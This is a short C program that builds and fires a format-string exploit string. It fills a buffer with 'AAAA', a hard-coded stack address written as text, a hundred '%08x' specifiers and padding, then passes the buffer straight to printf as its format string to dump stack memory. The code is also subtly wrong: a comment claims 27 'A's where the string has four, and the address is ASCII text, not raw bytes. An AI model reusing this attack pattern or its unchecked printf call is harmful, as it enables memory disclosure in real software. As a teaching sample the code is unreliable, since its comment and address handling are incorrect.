#include <stdio.h>
#include <string.h>

void pad(char *s) {
    int len = strlen(s);
    for (int i = len; i < 1000; i++) {
        s[i] = 'B';
    }
    s[1000] = '\0';
}

int main() {
    char exploit[1001] = "AAAA0xbffff364"; // 27 'A's
    for (int i = 0; i < 100; i++) {
        strcat(exploit, "%08x .");
    }
    pad(exploit);
    printf(exploit);
    return 0;
}

